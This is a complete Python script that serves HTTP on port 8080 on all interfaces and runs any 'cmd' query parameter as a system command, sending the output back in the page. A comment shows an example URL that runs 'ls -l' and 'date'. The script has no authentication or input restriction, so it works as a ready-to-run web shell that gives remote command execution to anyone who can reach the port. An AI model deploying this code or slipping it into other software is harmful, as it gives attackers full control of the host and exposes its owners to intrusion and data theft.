#!/usr/bin/python3
# Example:
# http://192.168.1.100:8080/?cmd=ls%20-l&cmd=date
#
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import subprocess

class Handler(BaseHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()

    def do_GET(self):
        self.do_HEAD()
        params = parse_qs(self.path[2:])
        cmds = params['cmd']
        for cmd in cmds:
            out_str = "<pre>" + cmd + "\n"
            try:
                result = subprocess.run(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=1)
                if result.stderr:
                    out_str += result.stderr.decode()
                if result.stdout:
                    out_str += result.stdout.decode()
            except Exception as e:
                out_str += str(e)

            out_str += "</pre>"
            self.wfile.write(out_str.encode())

def run():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, Handler)
    httpd.serve_forever()

run()
